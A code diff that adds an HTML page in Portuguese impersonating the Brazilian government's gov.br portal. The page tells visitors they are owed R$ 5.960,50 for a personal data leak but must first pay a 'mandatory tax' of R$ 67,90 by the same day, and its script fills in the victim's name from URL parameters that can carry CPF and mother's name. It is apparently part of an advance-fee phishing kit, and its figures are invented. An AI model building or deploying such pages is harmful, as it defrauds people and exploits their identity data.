@@ -1,0 +1,293 @@
+<html class="scroll-smooth" lang="pt-BR">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   Indenização Governamental
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <!-- User Data Manager -->
+  <script src="../../js/user-data-manager.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&amp;display=swap" rel="stylesheet"/>
+  <style>
+   body {
+      font-family: 'Inter', sans-serif;
+    }
+  </style>
+ </head>
+ <body class="bg-[#f6f6f1] flex justify-center p-4 min-h-screen">
+  <main class="max-w-md w-full border border-gray-400 rounded-2xl bg-[#f6f6f1] p-4">
+   <!-- Header -->
+   <header class="flex items-center border border-gray-400 rounded-lg p-2 mb-3 bg-white">
+    <img alt="Brasão da República Federativa do Brasil colorido oficial" class="w-28 h-28 object-contain" height="120" src="https://www.gov.br/planalto/pt-br/conheca-a-presidencia/biblioteca-da-pr/simbolos-nacionais/brasao-da-republica/brasaooficialcolorido.png" width="120"/>
+    <div class="flex-1 flex items-center justify-center">
+     <img alt="Logo gov.br azul e preto" class="max-w-[7.5rem] max-h-10 object-contain" height="40" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png" width="120"/>
+    </div>
+    <div class="text-[#1f2a44] text-right font-semibold text-lg leading-tight max-w-[8.5rem]">
+     <p>
+      Indenização
+     </p>
+     <p>
+      Governamental
+     </p>
+    </div>
+   </header>
+   <!-- Nome Completo -->
+   <label class="block text-xs text-gray-800 mb-1" for="nome">
+    Nome Completo
+   </label>
+   <input class="w-full border border-gray-400 rounded-md px-3 py-2 font-bold text-sm text-gray-900 mb-3 bg-white cursor-not-allowed" id="nome" readonly="" type="text" value="NOME NÃO INFORMADO"/>
+   <!-- Info boxes -->
+   <section class="flex flex-col sm:flex-row gap-3 mb-3">
+    <div class="flex-1 border border-gray-400 rounded-md p-2 bg-white">
+     <label class="block text-xs text-gray-800 mb-1">
+      Indenização a Receber
+     </label>
+     <p class="font-extrabold text-lg text-gray-900">
+      R$ 67,90
+     </p>
+    </div>
+    <div class="flex-1 border border-gray-400 rounded-md p-2 bg-white">
+     <label class="block text-xs text-gray-800 mb-1">
+      Data de Emissão
+     </label>
+     <p class="text-gray-900 text-sm">
+      06/08/2025
+     </p>
+    </div>
+    <div class="flex-1 border border-gray-400 rounded-md p-2 bg-white">
+     <label class="block text-xs text-gray-800 mb-1">
+      Vencimento
+     </label>
+     <p class="text-gray-900 text-sm">
+      06/08/2025
+     </p>
+    </div>
+   </section>
+   <!-- Table container -->
+   <section class="border border-gray-400 rounded-lg bg-white p-3 mb-3">
+    <div class="flex justify-between items-center mb-2">
+     <h2 class="bg-[#5f758a] text-white font-semibold text-sm rounded-md px-2 py-1 select-none max-w-[60%]">
+      Indenização a Receber
+     </h2>
+     <div class="text-right text-xs text-gray-900">
+      <p>
+       Imposto obrigatório:
+      </p>
+      <p class="font-extrabold text-base">
+       R$ 67,90
+      </p>
+     </div>
+    </div>
+    <div class="mb-2">
+     <p class="font-bold text-sm mb-1 select-none">
+      Vazamento de Dados Pessoais
+     </p>
+     <p class="text-xs text-gray-900 leading-tight">
+      Laudo técnico pericial comprovou o vazamento indevido de seus dados pessoais. Multas foram determinadas conforme tabela abaixo.
+     </p>
+    </div>
+    <table class="w-full text-xs text-gray-900 border border-gray-300 rounded-md border-collapse">
+     <thead>
+      <tr class="border-b border-gray-300">
+       <th class="text-left font-bold px-2 py-1">
+        Dado Pessoal
+       </th>
+       <th class="text-right font-bold px-2 py-1">
+        Multa
+       </th>
+       <th class="text-right font-bold px-2 py-1">
+        Juros
+       </th>
+       <th class="text-right font-bold px-2 py-1">
+        Total
+       </th>
+      </tr>
+     </thead>
+     <tbody>
+             <tr class="border-b border-gray-300">
+       <td class="px-2 py-1">
+        NOME COMPLETO
+       </td>
+       <td class="text-right px-2 py-1">
+        25,40
+       </td>
+       <td class="text-right px-2 py-1">
+        8,25
+       </td>
+       <td class="text-right px-2 py-1">
+        33,65
+       </td>
+      </tr>
+      <tr class="border-b border-gray-300">
+       <td class="px-2 py-1">
+        CPF
+       </td>
+       <td class="text-right px-2 py-1">
+        15,35
+       </td>
+       <td class="text-right px-2 py-1">
+        5,90
+       </td>
+       <td class="text-right px-2 py-1">
+        21,25
+       </td>
+      </tr>
+      <tr class="border-b border-gray-300">
+       <td class="px-2 py-1">
+        RG
+       </td>
+       <td class="text-right px-2 py-1">
+        8,10
+       </td>
+       <td class="text-right px-2 py-1">
+        1,40
+       </td>
+       <td class="text-right px-2 py-1">
+        9,50
+       </td>
+      </tr>
+      <tr class="border-b border-gray-300">
+       <td class="px-2 py-1">
+        RENDA MENSAL
+       </td>
+       <td class="text-right px-2 py-1">
+        2,95
+       </td>
+       <td class="text-right px-2 py-1">
+        0,55
+       </td>
+       <td class="text-right px-2 py-1">
+        3,50
+       </td>
+      </tr>
+      <tr>
+       <td class="px-2 py-1">
+        DADOS BANCARIOS
+       </td>
+       <td class="text-right px-2 py-1">
+        0,00
+       </td>
+       <td class="text-right px-2 py-1">
+        0,00
+       </td>
+       <td class="text-right px-2 py-1">
+        0,00
+       </td>
+      </tr>
+     </tbody>
+     <tfoot>
+      <tr class="border-t border-gray-300 font-bold">
+       <td class="px-2 py-1">
+        Detalhes
+       </td>
+       <td>
+       </td>
+       <td class="text-right px-2 py-1">
+        Total
+       </td>
+       <td class="text-right px-2 py-1">
+        R$ 5.960,50
+       </td>
+      </tr>
+     </tfoot>
+    </table>
+   </section>
+   <!-- Protocolo and QR code -->
+   <section class="flex flex-col sm:flex-row items-center justify-between border-t border-gray-400 pt-2 mb-3 text-xs text-gray-900">
+    <p class="select-text">
+     Protocolo de Solicitação; 202506030987-BR
+    </p>
+    <img alt="QR code preto e branco para protocolo de solicitação" class="mt-2 sm:mt-0 sm:ml-4 w-20 h-20 object-contain" height="80" src="https://storage.googleapis.com/a1aa/image/bd9f2306-713b-42a2-d79f-f10e6741a48d.jpg" width="80"/>
+   </section>
+   <!-- Footer text -->
+   <footer class="border-t border-gray-400 pt-2 text-xs text-gray-900">
+    <p>
+     Imposto obrigatório:
+    </p>
+    <p class="font-extrabold text-base">
+     R$ 67,90
+     <span class="font-normal">
+      até 06/08/2025
+     </span>
+    </p>
+   </footer>
+  </main>
+  
+  <script>
+    // Função para extrair parâmetros da URL
+    function getURLParameter(name) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(name);
+    }
+    
+    // Função para definir o nome do usuário
+    function setUserName() {
+      console.log('🔍 Carregando dados do usuário na página comprovante...');
+      
+      // PRIORIDADE 1: Verificar dados na URL
+      const urlParams = new URLSearchParams(window.location.search);
+      let userData = null;
+      
+      if (urlParams.has('nome') || urlParams.has('cpf')) {
+        userData = {
+          nome: urlParams.get('nome'),
+          cpf: urlParams.get('cpf'),
+          nascimento: urlParams.get('nascimento'),
+          nomeMae: urlParams.get('nomeMae'),
+          estadoCivil: urlParams.get('estadoCivil'),
+          nomeCompleto: urlParams.get('nomeCompleto') || urlParams.get('nome')
+        };
+        console.log('✅ Dados encontrados na URL:', userData);
+      }
+      
+      // PRIORIDADE 2: Tentar user-data-manager
+      if (!userData && typeof window.getUserData === 'function') {
+        try {
+          userData = window.getUserData();
+          console.log('✅ Dados obtidos via getUserData:', userData);
+        } catch (error) {
+          console.log('❌ Erro getUserData:', error);
+        }
+      }
+      
+      // PRIORIDADE 3: SessionStorage
+      if (!userData) {
+        const sessionData = sessionStorage.getItem('userData');
+        if (sessionData) {
+          try {
+            userData = JSON.parse(sessionData);
+            console.log('✅ Dados obtidos via sessionStorage:', userData);
+          } catch (error) {
+            console.log('❌ Erro ao parsear sessionStorage:', error);
+          }
+        }
+      }
+      
+      const nomeInput = document.getElementById('nome');
+      
+      if (userData && userData.nome) {
+        // Usar nome real do usuário
+        const nomeFormatado = userData.nome.toUpperCase();
+        nomeInput.value = nomeFormatado;
+        console.log('✅ Nome atualizado para:', nomeFormatado);
+      } else if (window.getUserFullName) {
+        // Usar dados do sistema de gestão de usuário
+        const nomeUsuario = window.getUserFullName();
+        nomeInput.value = nomeUsuario.toUpperCase();
+        console.log('✅ Nome obtido via getUserFullName:', nomeUsuario);
+      } else {
+        // Fallback para dados padrão
+        nomeInput.value = 'USUÁRIO PADRÃO';
+        console.log('⚠️ Usando nome padrão');
+      }
+    }
+    
+    // Executar quando a página carregar
+    document.addEventListener('DOMContentLoaded', function() {
+      setUserName();
+    });
+  </script>
+ </body>
+</html>
